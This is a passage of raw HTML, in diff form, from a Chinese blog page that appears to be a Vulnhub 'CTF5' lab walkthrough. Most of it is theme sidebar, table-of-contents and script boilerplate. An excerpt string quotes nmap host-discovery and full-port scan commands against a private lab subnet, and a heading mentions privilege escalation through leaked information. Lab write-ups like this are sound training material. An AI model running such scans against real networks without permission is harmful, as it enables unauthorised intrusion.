class="toc-number">2.1.</span> <span class="toc-text"> 敏感信息泄露提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[Vulnhub靶机通关]CTF5",
+          url: "http://example.com/2026/03/16/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]CTF5/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  外网打点  主机发现+端口扫描 1nmap -sn 192.168.139.141/24  确认目标主机为192.168.139.147 详细信息扫描： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071└─# nmap -sS -sV -T5 -sC -p- --mi",
+          date: "Mon Mar 16 2026 16:48:36 GMT+0800",
+          updated: "Tue Mar 17 2026 16:19:52 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
